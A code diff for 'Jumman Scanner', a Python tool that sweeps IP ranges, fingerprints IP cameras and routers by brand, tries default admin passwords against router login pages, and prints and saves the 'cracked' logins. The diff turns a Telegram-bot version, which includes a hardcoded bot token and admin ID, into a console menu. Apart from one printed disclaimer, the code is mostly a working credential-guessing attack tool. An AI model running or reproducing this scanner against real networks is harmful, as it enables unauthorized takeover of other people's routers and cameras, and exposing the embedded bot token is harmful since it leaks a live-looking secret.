@@ -15,8 +15,6 @@
 import os
 import sys
 import time
-import json
-import hashlib
 import socket
 import ipaddress
 import subprocess
@@ -24,6 +22,7 @@ import re
 import threading
 from datetime import datetime
 from concurrent.futures import ThreadPoolExecutor
+import requests
 
 # ============ PASSWORD PROTECTION ============
 REQUIRED_PASSWORD = "ch71"
@@ -52,120 +51,37 @@ def check_password():
     print("Contact the administrator for access.")
     sys.exit(1)
 
-# ============ INSTALL DEPENDENCIES ============
-def install_dependencies():
-    """Install required packages for Python 3.14"""
-    print("[*] Checking/Installing dependencies...")
-    
-    # Install requests
-    try:
-        import requests
-        print("[✓] requests already installed")
-    except ImportError:
-        print("[*] Installing requests...")
-        subprocess.check_call([sys.executable, "-m", "pip", "install", "requests"])
-    
-    # Install python-telegram-bot (newer version)
-    try:
-        import telegram
-        print("[✓] python-telegram-bot already installed")
-    except ImportError:
-        print("[*] Installing python-telegram-bot...")
-        subprocess.check_call([sys.executable, "-m", "pip", "install", "python-telegram-bot==20.7"])
-    
-    # Install urllib3 for Python 3.14
-    try:
-        import urllib3
-        print("[✓] urllib3 already installed")
-    except ImportError:
-        print("[*] Installing urllib3...")
-        subprocess.check_call([sys.executable, "-m", "pip", "install", "urllib3"])
-
-# ============ IMPORTS ============
-install_dependencies()
-
-import requests as http_requests
-from telegram import InlineKeyboardButton, InlineKeyboardMarkup, Update
-from telegram.ext import Application, CommandHandler, CallbackQueryHandler, MessageHandler, filters, ContextTypes
-
-# ============ BOT CONFIGURATION ============
-BOT_TOKEN = "8818530631:AAEEBZA59IFgVOAxP819XcQAge2Y-tfCZ5Y"
-ADMIN_IDS = [6501841918]
-
-KEY_FILE = "access.key"
-CONFIG_FILE = "config.json"
-
-# ============ ACCESS KEY SYSTEM ============
-class AccessKeySystem:
-    def __init__(self):
-        self.key_file = KEY_FILE
-        self.config_file = CONFIG_FILE
-        self.load_config()
-    
-    def load_config(self):
-        try:
-            if os.path.exists(self.config_file):
-                with open(self.config_file, 'r') as f:
-                    self.config = json.load(f)
-            else:
-                self.config = {'first_run': True}
-        except:
-            self.config = {'first_run': True}
-    
-    def save_config(self):
-        try:
-            with open(self.config_file, 'w') as f:
-                json.dump(self.config, f)
-        except:
-            pass
-    
-    def generate_key_hash(self, key):
-        return hashlib.sha256(key.encode()).hexdigest()
-    
-    def is_first_run(self):
-        return self.config.get('first_run', True)
-    
-    def set_first_run_done(self):
-        self.config['first_run'] = False
-        self.save_config()
-    
-    def save_key(self, key):
-        try:
-            key_hash = self.generate_key_hash(key)
-            with open(self.key_file, 'w') as f:
-                f.write(key_hash)
-            return True
-        except:
-            return False
-    
-    def verify_key(self, key):
-        try:
-            if not os.path.exists(self.key_file):
-                return False
-            with open(self.key_file, 'r') as f:
-                stored_hash = f.read().strip()
-            key_hash = self.generate_key_hash(key)
-            return key_hash == stored_hash
-        except:
-            return False
-    
-    def reset_key(self):
-        if os.path.exists(self.key_file):
-            os.remove(self.key_file)
-        if os.path.exists(self.config_file):
-            os.remove(self.config_file)
-        return True
-
-
-# ============ SCANNER FUNCTIONS ============
+# ============ SCANNER CLASS ============
 class JummanScanner:
     def __init__(self):
-        self.results = {}
         self.cameras = []
         self.routers = []
         self.cracked = []
         self.scanning = False
+        self.total_ips = 0
+        self.scanned = 0
         
+    def clear_screen(self):
+        os.system('cls' if os.name == 'nt' else 'clear')
+    
+    def print_banner(self):
+        banner = """
+╔══════════════════════════════════════════════════════════════╗
+║                                                              ║
+║     🔥 JUMMAN SCANNER - TERMUX EDITION 🔥                 ║
+║     📷 IP Camera & Router Scanner                          ║
+║     👑 Owner: Jumman                                       ║
+║     🔐 Password Protected                                  ║
+║     ⚡ Super Fast Scanner                                  ║
+║                                                              ║
+╚══════════════════════════════════════════════════════════════╝
+        """
+        print(banner)
+        print(f"[✓] Owner: Jumman")
+        print(f"[✓] Version: 3.2")
+        print(f"[✓] Time: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
+        print("=" * 60)
+    
     def validate_ip(self, ip_str):
         try:
             ipaddress.IPv4Address(ip_str)
@@ -192,79 +108,42 @@ class JummanScanner:
         except:
             return "No Title"
     
-    def scan_single_ip(self, ip):
-        results = []
-        ports = [80, 8080, 443, 8081, 554, 8000, 37777]
-        
-        for port in ports:
-            try:
-                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-                sock.settimeout(0.5)
-                result = sock.connect_ex((ip, port))
-                sock.close()
-                
-                if result == 0:
-                    try:
-                        protocol = 'https' if port == 443 else 'http'
-                        url = f"{protocol}://{ip}:{port}"
-                        response = http_requests.get(url, timeout=2, verify=False, allow_redirects=True)
-                        
-                        if response.status_code in [200, 401, 403]:
-                            content = response.text.lower()
-                            title = self.extract_title(response.text)
-                            
-                            camera_keywords = ['camera', 'cam', 'ipcam', 'web service', 'dvr', 
-                                             'hikvision', 'dahua', 'login.asp', 'web', 'cgi-bin']
-                            is_camera = any(kw in content for kw in camera_keywords)
-                            
-                            router_keywords = ['tenda', 'd-link', 'dlink', 'tp-link', 'tplink', 
-                                             'router', 'admin', 'login', 'gateway']
-                            is_router = any(kw in content for kw in router_keywords)
-                            
-                            if is_camera:
-                                brand = 'Unknown'
-                                if 'hikvision' in content:
-                                    brand = 'HIK Vision'
-                                elif 'dahua' in content:
-                                    brand = 'Dahua'
-                                elif 'tenda' in content:
-                                    brand = 'Tenda'
-                                elif 'tp-link' in content:
-                                    brand = 'TP-Link'
-                                
-                                results.append({
-                                    'ip': ip,
-                                    'port': port,
-                                    'type': 'Camera',
-                                    'brand': brand,
-                                    'title': title,
-                                    'url': url
-                                })
-                            elif is_router:
-                                brand = 'unknown'
-                                for b in ['tenda', 'dlink', 'tplink']:
-                                    if b in content:
-                                        brand = b
-                                        break
-                                
-                                credentials = self.test_credentials(url, brand)
-                                
-                                results.append({
-                                    'ip': ip,
-                                    'port': port,
-                                    'type': 'Router',
-                                    'brand': brand,
-                                    'url': url,
-                                    'credentials': credentials
-                                })
-                    except:
-                        pass
-            except:
-                pass
-        
-        return results
+    def get_brand(self, content, device_type):
+        """Identify brand from content"""
+        if device_type == 'Camera':
+            if 'hikvision' in content:
+                return 'HIK Vision'
+            elif 'dahua' in content:
+                return 'Dahua'
+            elif 'tenda' in content:
+                return 'Tenda'
+            elif 'tp-link' in content:
+                return 'TP-Link'
+            elif 'd-link' in content or 'dlink' in content:
+                return 'D-Link'
+            elif 'reolink' in content:
+                return 'Reolink'
+            elif 'amcrest' in content:
+                return 'Amcrest'
+            elif 'foscam' in content:
+                return 'Foscam'
+            elif 'axis' in content:
+                return 'Axis'
+            else:
+                return 'Unknown'
+        elif device_type == 'Router':
+            if 'tenda' in content:
+                return 'Tenda'
+            elif 'd-link' in content or 'dlink' in content:
+                return 'D-Link'
+            elif 'tp-link' in content or 'tplink' in content:
+                return 'TP-Link'
+            else:
+                return 'Unknown'
+        return 'Unknown'
     
-    def test_credentials(self, url, brand):
+    def test_credentials(self, url):
+        """Test 4 passwords on router"""
         credentials = [
             ('admin', 'admin'),
             ('admin', 'admin1'),
@@ -272,7 +151,6 @@ class JummanScanner:
             ('admin', 'admin123')
         ]
         
-        found = []
         login_paths = ['/', '/login', '/login.html', '/admin', '/cgi-bin/login']
         
         for username, password in credentials:
@@ -287,24 +165,86 @@ class JummanScanner:
                         'usr': username,
                         'pwd': password,
                     }
-                    response = http_requests.post(test_url, data=form_data, timeout=2, 
+                    response = requests.post(test_url, data=form_data, timeout=2, 
                                             allow_redirects=True, verify=False)
                     
                     if response.status_code == 200:
                         content = response.text.lower()
                         if 'invalid' not in content and 'incorrect' not in content:
-                            found.append({
+                            return {
                                 'username': username,
                                 'password': password,
                                 'url': test_url
-                            })
-                            return found
+                            }
                 except:
                     pass
         
-        return found
+        return None
+    
+    def scan_single_ip(self, ip):
+        """Scan single IP for camera or router"""
+        results = []
+        ports = [80, 8080, 443, 8081, 554, 8000, 37777]
+        
+        for port in ports:
+            try:
+                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+                sock.settimeout(0.5)
+                result = sock.connect_ex((ip, port))
+                sock.close()
+                
+                if result == 0:
+                    try:
+                        protocol = 'https' if port == 443 else 'http'
+                        url = f"{protocol}://{ip}:{port}"
+                        response = requests.get(url, timeout=2, verify=False, allow_redirects=True)
+                        
+                        if response.status_code in [200, 401, 403]:
+                            content = response.text.lower()
+                            title = self.extract_title(response.text)
+                            
+                            # Camera detection
+                            camera_keywords = ['camera', 'cam', 'ipcam', 'web service', 'dvr', 
+                                             'hikvision', 'dahua', 'login.asp', 'web', 'cgi-bin',
+                                             'snapshot', 'video', 'stream', 'live']
+                            is_camera = any(kw in content for kw in camera_keywords)
+                            
+                            # Router detection
+                            router_keywords = ['tenda', 'd-link', 'dlink', 'tp-link', 'tplink', 
+                                             'router', 'admin', 'login', 'gateway']
+                            is_router = any(kw in content for kw in router_keywords)
+                            
+                            if is_camera:
+                                brand = self.get_brand(content, 'Camera')
+                                results.append({
+                                    'ip': ip,
+                                    'port': port,
+                                    'type': 'Camera',
+                                    'brand': brand,
+                                    'title': title,
+                                    'url': url
+                                })
+                            elif is_router:
+                                brand = self.get_brand(content, 'Router')
+                                creds = self.test_credentials(url)
+                                
+                                results.append({
+                                    'ip': ip,
+                                    'port': port,
+                                    'type': 'Router',
+                                    'brand': brand,
+                                    'url': url,
+                                    'credentials': creds
+                                })
+                    except:
+                        pass
+            except:
+                pass
+        
+        return results
     
     def scan_range(self, start_ip, end_ip):
+        """Scan IP range"""
         results = []
         try:
             start = int(ipaddress.IPv4Address(start_ip))
@@ -315,464 +255,265 @@ class JummanScanner:
             
             ip_list = []
             for ip_int in range(start, end + 1):
-                if ip_int - start > 500:
+                if ip_int - start > 1000:
+                    print("[!] Limited to 1000 IPs for performance")
                     break
                 ip_list.append(str(ipaddress.IPv4Address(ip_int)))
             
-            with ThreadPoolExecutor(max_workers=100) as executor:
+            self.total_ips = len(ip_list)
+            self.scanned = 0
+            
+            print(f"\n[*] Scanning {self.total_ips} IPs...\n")
+            
+            with ThreadPoolExecutor(max_workers=150) as executor:
                 future_results = executor.map(self.scan_single_ip, ip_list)
                 for result in future_results:
+                    self.scanned += 1
+                    if self.scanned % 10 == 0:
+                        print(f"\r[*] Progress: {self.scanned}/{self.total_ips} IPs", end='')
+                        sys.stdout.flush()
                     if result:
                         results.extend(result)
             
+            print()
             return results
         except Exception as e:
             return {'error': str(e)}
     
-    def scan_common_ranges(self):
-        all_results = []
-        common_ranges = [
-            ('192.168.1.1', '192.168.1.254'),
-            ('192.168.0.1', '192.168.0.254'),
-            ('10.0.0.1', '10.0.0.254'),
-            ('172.16.0.1', '172.16.0.254'),
-        ]
-        
-        for start, end in common_ranges:
-            results = self.scan_range(start, end)
-            if isinstance(results, list):
-                all_results.extend(results)
-        
-        return all_results
-
-
-# ============ TELEGRAM BOT (UPDATED FOR v20.x) ============
-class JummanBot:
-    def __init__(self, token):
-        self.token = token
-        self.scanner = JummanScanner()
-        self.key_system = AccessKeySystem()
-        self.application = None
-        
-    async def start(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
-        """Start command handler"""
-        user_id = update.effective_user.id
-        
-        if user_id not in ADMIN_IDS:
-            await update.message.reply_text("🚫 *Access Denied!*", parse_mode='Markdown')
-            return
-        
-        keyboard = [
-            [InlineKeyboardButton("⚡ Quick Scan", callback_data='quick_scan')],
-            [InlineKeyboardButton("🔍 IP Range Scan", callback_data='range_scan')],
-            [InlineKeyboardButton("📷 Camera Scanner", callback_data='camera_scan')],
-            [InlineKeyboardButton("🌐 Router Scanner", callback_data='router_scan')],
-            [InlineKeyboardButton("🌍 Full Scan", callback_data='full_scan')],
-            [InlineKeyboardButton("🔐 Admin", callback_data='admin_panel')],
-            [InlineKeyboardButton("ℹ️ Help", callback_data='help')]
-        ]
-        reply_markup = InlineKeyboardMarkup(keyboard)
-        
-        welcome_msg = (
-            "🤖 *Jumman Scanner Bot*\n\n"
-            "🔥 *Features:*\n"
-            "• 📷 IP Camera Detection\n"
-            "• 🌐 Router Detection\n"
-            "• 💀 4 Password Testing\n"
-            "• ⚡ Super Fast Scanning\n\n"
-            "👑 *Owner:* Jumman\n"
-            "📱 *Version:* 3.2\n\n"
-            "Select an option!"
-        )
-        
-        await update.message.reply_text(welcome_msg, reply_markup=reply_markup, parse_mode='Markdown')
-    
-    async def button_callback(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
-        """Handle button callbacks"""
-        query = update.callback_query
-        await query.answer()
-        
-        user_id = update.effective_user.id
-        if user_id not in ADMIN_IDS:
-            await query.edit_message_text("🚫 Access Denied!")
-            return
-        
-        data = query.data
-        
-        if data == 'quick_scan':
-            await self.quick_scan(update, context)
-        elif data == 'range_scan':
-            await query.edit_message_text("🔍 Send: `/setscan 192.168.1.1 192.168.1.255`", parse_mode='Markdown')
-        elif data == 'camera_scan':
-            await query.edit_message_text("📷 Send: `/camerascan 192.168.1.1 192.168.1.255`", parse_mode='Markdown')
-        elif data == 'router_scan':
-            await query.edit_message_text("🌐 Send: `/routerscan 192.168.1.1 192.168.1.255`", parse_mode='Markdown')
-        elif data == 'full_scan':
-            await self.full_scan(update, context)
-        elif data == 'admin_panel':
-            await self.admin_panel(update, context)
-        elif data == 'help':
-            await self.help(update, context)
-        elif data == 'main_menu':
-            await self.start(update, context)
-    
-    async def quick_scan(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
-        """Quick scan local network"""
-        query = update.callback_query
-        
-        local_ip = self.scanner.get_local_ip()
-        if not local_ip:
-            await query.edit_message_text("❌ Could not detect local network!")
-            return
-        
-        subnet = ".".join(local_ip.split(".")[:3])
-        start_ip = f"{subnet}.1"
-        end_ip = f"{subnet}.50"
-        
-        await query.edit_message_text(
-            f"⚡ *Quick Scan Started!*\n\n"
-            f"📡 Scanning: {start_ip} - {end_ip}\n"
-            f"⏳ Please wait...",
-            parse_mode='Markdown'
-        )
-        
-        results = self.scanner.scan_range(start_ip, end_ip)
-        context.bot_data['last_results'] = results
-        await self.display_results(update, context, results, query.message)
-    
-    async def full_scan(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
-        """Full network scan"""
-        query = update.callback_query
-        
-        await query.edit_message_text(
-            "🌍 *Full Scan Started!*\n\n"
-            "⏳ This may take 3-5 minutes...",
-            parse_mode='Markdown'
-        )
-        
-        results = self.scanner.scan_common_ranges()
-        context.bot_data['last_results'] = results
-        await self.display_results(update, context, results, query.message)
-    
-    async def admin_panel(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
-        """Admin panel"""
-        query = update.callback_query
-        user_id = update.effective_user.id
-        
-        if user_id not in ADMIN_IDS:
-            await query.edit_message_text("🚫 Admin access required!")
-            return
-        
-        keyboard = [
-            [InlineKeyboardButton("🔄 Reset Key", callback_data='reset_key')],
-            [InlineKeyboardButton("🔙 Main", callback_data='main_menu')]
-        ]
-        reply_markup = InlineKeyboardMarkup(keyboard)
-        
-        await query.edit_message_text("🔐 *Admin Panel*", reply_markup=reply_markup, parse_mode='Markdown')
-    
-    async def reset_key(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
-        """Reset access key"""
-        query = update.callback_query
-        user_id = update.effective_user.id
-        
-        if user_id not in ADMIN_IDS:
-            await query.edit_message_text("🚫 Admin access required!")
-            return
-        
-        if self.key_system.reset_key():
-            await query.edit_message_text("✅ Key reset! Use /setkey 123456")
-        else:
-            await query.edit_message_text("❌ Failed to reset!")
-    
-    async def help(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
-        """Help command"""
-        query = update.callback_query
-        
-        help_text = """
-ℹ️ *JUMMAN SCANNER BOT*
-
-🤖 *Commands:*
-/start - Main menu
-/quickscan - Quick scan
-/setscan <start> <end> - Custom scan
-/fullscan - Full network scan
-/camerascan <start> <end> - Camera only
-/routerscan <start> <end> - Router only
-/status - Bot status
-/help - This help
-/setkey 123456 - Set access key
-
-💀 *Passwords Tested:*
-• admin:admin
-• admin:admin1
-• admin:admin2
-• admin:admin123
-
-👑 *Owner:* Jumman
-📱 *Version:* 3.2
-"""
-        
-        keyboard = [[InlineKeyboardButton("🔙 Main", callback_data='main_menu')]]
-        reply_markup = InlineKeyboardMarkup(keyboard)
-        
-        await query.edit_message_text(help_text, reply_markup=reply_markup, parse_mode='Markdown')
-    
-    async def display_results(self, update: Update, context: ContextTypes.DEFAULT_TYPE, results, message=None):
+    def display_results(self, results):
         """Display scan results"""
         if not results:
-            if message:
-                await message.edit_text("❌ No devices found.")
+            print("\n❌ No devices found.")
             return
         
         cameras = [r for r in results if r['type'] == 'Camera']
         routers = [r for r in results if r['type'] == 'Router']
         cracked = [r for r in routers if r.get('credentials')]
         
-        text = "🔍 *Results*\n\n"
-        text += f"📷 Cameras: {len(cameras)}\n"
-        text += f"🌐 Routers: {len(routers)}\n"
-        text += f"💀 Cracked: {len(cracked)}\n\n"
+        print("\n" + "=" * 60)
+        print("📊 SCAN RESULTS")
+        print("=" * 60)
+        print(f"\n📷 Cameras Found: {len(cameras)}")
+        print(f"🌐 Routers Found: {len(routers)}")
+        print(f"💀 Cracked: {len(cracked)}")
         
         if cameras:
-            text += "*📷 Cameras:*\n"
-            for cam in cameras[:5]:
-                text += f"• {cam['ip']}:{cam['port']} - {cam['title'][:30]}\n"
-            if len(cameras) > 5:
-                text += f"_...and {len(cameras)-5} more_\n"
-            text += "\n"
+            print("\n" + "-" * 40)
+            print("📷 CAMERAS:")
+            print("-" * 40)
+            for i, cam in enumerate(cameras, 1):
+                print(f"\n{i}. {cam['ip']}:{cam['port']}")
+                print(f"   Brand: {cam['brand']}")
+                print(f"   Title: {cam['title'][:50]}")
+                print(f"   URL: {cam['url']}")
         
         if routers:
-            text += "*🌐 Routers:*\n"
-            for router in routers[:5]:
-                text += f"• {router['ip']}:{router['port']} [{router['brand'].upper()}]\n"
+            print("\n" + "-" * 40)
+            print("🌐 ROUTERS:")
+            print("-" * 40)
+            for i, router in enumerate(routers, 1):
+                print(f"\n{i}. {router['ip']}:{router['port']}")
+                print(f"   Brand: {router['brand'].upper()}")
+                print(f"   URL: {router['url']}")
                 if router.get('credentials'):
-                    cred = router['credentials'][0]
-                    text += f"  ✅ `{cred['username']}:{cred['password']}`\n"
-            if len(routers) > 5:
-                text += f"_...and {len(routers)-5} more_\n"
-        
-        keyboard = [
-            [InlineKeyboardButton("🔄 Scan Again", callback_data='quick_scan')],
-            [InlineKeyboardButton("🔙 Main", callback_data='main_menu')]
-        ]
-        reply_markup = InlineKeyboardMarkup(keyboard)
-        
-        if message:
-            await message.edit_text(text, reply_markup=reply_markup, parse_mode='Markdown')
-        else:
-            await update.message.reply_text(text, reply_markup=reply_markup, parse_mode='Markdown')
-    
-    async def handle_message(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
-        """Handle text messages"""
-        user_id = update.effective_user.id
-        
-        if user_id not in ADMIN_IDS:
-            await update.message.reply_text("🚫 Access Denied!")
-            return
-        
-        text = update.message.text
-        
-        if text.startswith('/setkey'):
-            try:
-                key = text.split()[1]
-                if key.isdigit() and len(key) == 6:
-                    if self.key_system.save_key(key):
-                        await update.message.reply_text("✅ Key set successfully!")
-                    else:
-                        await update.message.reply_text("❌ Failed to set key!")
+                    cred = router['credentials']
+                    print(f"   ✅ CRACKED: {cred['username']}:{cred['password']}")
                 else:
-                    await update.message.reply_text("❌ Use 6 digits! Example: /setkey 123456")
-            except:
-                await update.message.reply_text("❌ Usage: /setkey 123456")
-            return
+                    print(f"   ❌ Not Cracked")
         
-        if text.startswith('/camerascan'):
-            try:
-                parts = text.split()[1:]
-                if len(parts) >= 2:
-                    start_ip, end_ip = parts[0], parts[1]
-                    if self.scanner.validate_ip(start_ip) and self.scanner.validate_ip(end_ip):
-                        await update.message.reply_text(f"📷 *Camera Scan Started!*", parse_mode='Markdown')
-                        results = self.scanner.scan_range(start_ip, end_ip)
-                        camera_results = [r for r in results if r['type'] == 'Camera'] if isinstance(results, list) else []
-                        context.bot_data['last_results'] = camera_results
-                        await self.display_results(update, context, camera_results)
-                    else:
-                        await update.message.reply_text("❌ Invalid IP!")
-                else:
-                    await update.message.reply_text("❌ Usage: /camerascan <start> <end>")
-            except:
-                pass
-            return
+        if cracked:
+            print("\n" + "-" * 40)
+            print("💀 CRACKED CREDENTIALS:")
+            print("-" * 40)
+            for i, c in enumerate(cracked, 1):
+                if c.get('credentials'):
+                    cred = c['credentials']
+                    print(f"\n{i}. {c['ip']} [{c['brand'].upper()}]")
+                    print(f"   👤 {cred['username']}:{cred['password']}")
+                    print(f"   🔗 {cred['url']}")
         
-        if text.startswith('/routerscan'):
-            try:
-                parts = text.split()[1:]
-                if len(parts) >= 2:
-                    start_ip, end_ip = parts[0], parts[1]
-                    if self.scanner.validate_ip(start_ip) and self.scanner.validate_ip(end_ip):
-                        await update.message.reply_text(f"🌐 *Router Scan Started!*", parse_mode='Markdown')
-                        results = self.scanner.scan_range(start_ip, end_ip)
-                        router_results = [r for r in results if r['type'] == 'Router'] if isinstance(results, list) else []
-                        context.bot_data['last_results'] = router_results
-                        await self.display_results(update, context, router_results)
-                    else:
-                        await update.message.reply_text("❌ Invalid IP!")
-                else:
-                    await update.message.reply_text("❌ Usage: /routerscan <start> <end>")
-            except:
-                pass
-            return
-        
-        if text.startswith('/fullscan'):
-            await update.message.reply_text("🌍 *Full Scan Started!*", parse_mode='Markdown')
-            results = self.scanner.scan_common_ranges()
-            context.bot_data['last_results'] = results
-            await self.display_results(update, context, results)
-            return
-        
-        if text.startswith('/setscan'):
-            try:
-                parts = text.split()[1:]
-                if len(parts) >= 2:
-                    start_ip, end_ip = parts[0], parts[1]
-                    if self.scanner.validate_ip(start_ip) and self.scanner.validate_ip(end_ip):
-                        await update.message.reply_text(f"🔍 *Scan Started!*", parse_mode='Markdown')
-                        results = self.scanner.scan_range(start_ip, end_ip)
-                        context.bot_data['last_results'] = results
-                        await self.display_results(update, context, results)
-                    else:
-                        await update.message.reply_text("❌ Invalid IP!")
-                else:
-                    await update.message.reply_text("❌ Usage: /setscan <start> <end>")
-            except:
-                pass
+        print("\n" + "=" * 60)
     
-    async def quickscan_command(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
-        """Quick scan command"""
-        user_id = update.effective_user.id
-        if user_id not in ADMIN_IDS:
-            await update.message.reply_text("🚫 Access Denied!")
+    def save_results(self, results):
+        """Save results to file"""
+        if not results:
             return
         
-        local_ip = self.scanner.get_local_ip()
-        if not local_ip:
-            await update.message.reply_text("❌ Could not detect local network!")
-            return
+        filename = f"scan_results_{int(time.time())}.txt"
         
-        subnet = ".".join(local_ip.split(".")[:3])
-        start_ip = f"{subnet}.1"
-        end_ip = f"{subnet}.50"
-        
-        await update.message.reply_text(f"⚡ *Quick Scan Started!*", parse_mode='Markdown')
-        results = self.scanner.scan_range(start_ip, end_ip)
-        context.bot_data['last_results'] = results
-        await self.display_results(update, context, results)
-    
-    async def status_command(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
-        """Check bot status"""
-        user_id = update.effective_user.id
-        if user_id not in ADMIN_IDS:
-            await update.message.reply_text("🚫 Access Denied!")
-            return
-        
-        status_text = (
-            "📊 *Status*\n\n"
-            f"Bot: 🟢 Online\n"
-            f"Version: 3.2\n"
-            f"Owner: Jumman\n\n"
-            "/start - Main menu"
-        )
-        await update.message.reply_text(status_text, parse_mode='Markdown')
-    
-    async def help_command(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
-        """Help command"""
-        user_id = update.effective_user.id
-        if user_id not in ADMIN_IDS:
-            await update.message.reply_text("🚫 Access Denied!")
-            return
-        
-        help_text = """
-ℹ️ *JUMMAN SCANNER BOT*
-
-🤖 *Commands:*
-/start - Main menu
-/quickscan - Quick scan
-/setscan <start> <end> - Custom scan
-/fullscan - Full scan
-/camerascan <start> <end> - Camera only
-/routerscan <start> <end> - Router only
-/status - Bot status
-/help - This help
-/setkey 123456 - Set access key
-
-💀 *Passwords Tested:*
-• admin:admin
-• admin:admin1
-• admin:admin2
-• admin:admin123
-
-👑 *Owner:* Jumman
-"""
-        
-        await update.message.reply_text(help_text, parse_mode='Markdown')
-    
-    async def error_handler(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
-        """Handle errors"""
-        print(f"[!] Error: {context.error}")
+        try:
+            with open(filename, 'w') as f:
+                f.write("=" * 60 + "\n")
+                f.write("JUMMAN SCANNER - SCAN RESULTS\n")
+                f.write("=" * 60 + "\n")
+                f.write(f"Date: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
+                f.write("=" * 60 + "\n\n")
+                
+                cameras = [r for r in results if r['type'] == 'Camera']
+                routers = [r for r in results if r['type'] == 'Router']
+                
+                if cameras:
+                    f.write("📷 CAMERAS FOUND:\n")
+                    f.write("-" * 40 + "\n")
+                    for cam in cameras:
+                        f.write(f"IP: {cam['ip']}:{cam['port']}\n")
+                        f.write(f"Brand: {cam['brand']}\n")
+                        f.write(f"Title: {cam['title']}\n")
+                        f.write(f"URL: {cam['url']}\n")
+                        f.write("-" * 40 + "\n")
+                    f.write("\n")
+                
+                if routers:
+                    f.write("🌐 ROUTERS FOUND:\n")
+                    f.write("-" * 40 + "\n")
+                    for router in routers:
+                        f.write(f"IP: {router['ip']}:{router['port']}\n")
+                        f.write(f"Brand: {router['brand'].upper()}\n")
+                        if router.get('credentials'):
+                            cred = router['credentials']
+                            f.write(f"CRACKED: {cred['username']}:{cred['password']}\n")
+                            f.write(f"URL: {cred['url']}\n")
+                        else:
+                            f.write("Not Cracked\n")
+                        f.write("-" * 40 + "\n")
+                    f.write("\n")
+                
+                f.write("=" * 60 + "\n")
+                f.write(f"Total IPs Scanned: {self.total_ips}\n")
+                f.write(f"Cameras Found: {len(cameras)}\n")
+                f.write(f"Routers Found: {len(routers)}\n")
+                f.write(f"Cracked: {len([r for r in routers if r.get('credentials')])}\n")
+            
+            print(f"\n✅ Results saved to: {filename}")
+        except Exception as e:
+            print(f"\n❌ Error saving: {e}")
     
     def run(self):
-        """Run the bot"""
-        print("=" * 40)
-        print("🤖 Jumman Scanner Bot")
-        print(f"👑 Owner: Jumman")
-        print("📱 Version: 3.2")
-        print("=" * 40)
-        print("\n✅ Bot starting...")
+        """Main execution"""
+        self.clear_screen()
+        self.print_banner()
         
-        # Create application
-        self.application = Application.builder().token(self.token).build()
+        print("\n⚠️  LEGAL DISCLAIMER:")
+        print("This tool is for authorized testing only.")
+        print("Unauthorized access to networks is illegal.\n")
         
-        # Add handlers
-        self.application.add_handler(CommandHandler("start", self.start))
-        self.application.add_handler(CommandHandler("quickscan", self.quickscan_command))
-        self.application.add_handler(CommandHandler("setscan", self.handle_message))
-        self.application.add_handler(CommandHandler("fullscan", self.handle_message))
-        self.application.add_handler(CommandHandler("camerascan", self.handle_message))
-        self.application.add_handler(CommandHandler("routerscan", self.handle_message))
-        self.application.add_handler(CommandHandler("status", self.status_command))
-        self.application.add_handler(CommandHandler("help", self.help_command))
-        self.application.add_handler(CommandHandler("setkey", self.handle_message))
+        print("📌 SCAN OPTIONS:")
+        print("1. Quick Scan (Local Network - 50 IPs)")
+        print("2. Custom IP Range")
+        print("3. Full Network Scan (All Common Ranges)")
+        print("4. Exit")
+        print()
         
-        self.application.add_handler(CallbackQueryHandler(self.button_callback))
-        self.application.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, self.handle_message))
+        choice = input("Select option (1-4): ").strip()
         
-        # Error handler
-        self.application.add_error_handler(self.error_handler)
+        if choice == '1':
+            # Quick Scan
+            local_ip = self.get_local_ip()
+            if not local_ip:
+                print("❌ Could not detect local network!")
+                return
+            
+            subnet = ".".join(local_ip.split(".")[:3])
+            start_ip = f"{subnet}.1"
+            end_ip = f"{subnet}.50"
+            
+            print(f"\n⚡ Quick Scan: {start_ip} - {end_ip}")
+            results = self.scan_range(start_ip, end_ip)
+            
+            if isinstance(results, dict) and 'error' in results:
+                print(f"\n❌ Error: {results['error']}")
+                return
+            
+            self.display_results(results)
+            
+            save = input("\n💾 Save results? (y/n): ").strip().lower()
+            if save == 'y':
+                self.save_results(results)
         
-        # Start bot
-        self.application.run_polling(allowed_updates=Update.ALL_TYPES)
+        elif choice == '2':
+            # Custom Range
+            print("\n🔍 Enter IP Range:")
+            start_ip = input("Start IP: ").strip()
+            end_ip = input("End IP: ").strip()
+            
+            if not self.validate_ip(start_ip) or not self.validate_ip(end_ip):
+                print("❌ Invalid IP format!")
+                return
+            
+            results = self.scan_range(start_ip, end_ip)
+            
+            if isinstance(results, dict) and 'error' in results:
+                print(f"\n❌ Error: {results['error']}")
+                return
+            
+            self.display_results(results)
+            
+            save = input("\n💾 Save results? (y/n): ").strip().lower()
+            if save == 'y':
+                self.save_results(results)
+        
+        elif choice == '3':
+            # Full Scan
+            print("\n🌍 Full Network Scan Started!")
+            print("Scanning common ranges...")
+            print("• 192.168.1.1 - 192.168.1.254")
+            print("• 192.168.0.1 - 192.168.0.254")
+            print("• 10.0.0.1 - 10.0.0.254")
+            print("• 172.16.0.1 - 172.16.0.254")
+            print("\n⏳ This may take a while...\n")
+            
+            all_results = []
+            ranges = [
+                ('192.168.1.1', '192.168.1.254'),
+                ('192.168.0.1', '192.168.0.254'),
+                ('10.0.0.1', '10.0.0.254'),
+                ('172.16.0.1', '172.16.0.254'),
+            ]
+            
+            for start, end in ranges:
+                print(f"\n[*] Scanning: {start} - {end}")
+                results = self.scan_range(start, end)
+                if isinstance(results, list):
+                    all_results.extend(results)
+            
+            self.display_results(all_results)
+            
+            save = input("\n💾 Save results? (y/n): ").strip().lower()
+            if save == 'y':
+                self.save_results(all_results)
+        
+        elif choice == '4':
+            print("\n👋 Goodbye!")
+            sys.exit(0)
+        
+        else:
+            print("❌ Invalid choice!")
+        
